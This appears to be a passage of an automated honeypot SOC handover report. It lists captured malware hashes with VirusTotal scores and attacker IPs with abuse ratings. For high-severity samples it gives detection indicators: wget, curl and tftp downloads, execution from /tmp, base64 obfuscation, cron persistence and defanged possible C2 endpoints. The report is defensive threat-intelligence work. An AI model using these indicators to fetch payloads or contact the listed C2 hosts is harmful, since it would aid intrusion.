| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.254.214[.]117` | MY | Alibaba Cloud - MY | **100** ⚠️ | 29 |
| `50.62.181[.]92` | US | GoDaddy.com, LLC | **100** ⚠️ | 9 |
| `178.216.165[.]187` | RU | Morton-Telekom Ltd | **100** ⚠️ | 50 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `120.48.96[.]161` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 4 |
| `66.132.172[.]100` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `85.217.149[.]29` | CA | NL MODAT | **100** ⚠️ | 50 |
| `213.66.197[.]199` | SE | Telia Network services | **100** ⚠️ | 41 |
| `218.4.156[.]254` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `210.4.68[.]72` | BD | BDCOM Online Limited, Internet Service Provider, Dhaka, Bangladesh | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 157 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 133 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |

---

## 🔕 False Positive Summary (41 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 18 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 294 cases |
| Tool 34  | Credential Extractor        | ✅ 168 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 126 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 41 filtered (14.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 75 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 33 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 133 priority case(s) shown individually · 48 recon entry/entries in table (17 group(s) consolidating 89 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-16T14:03:02Z_
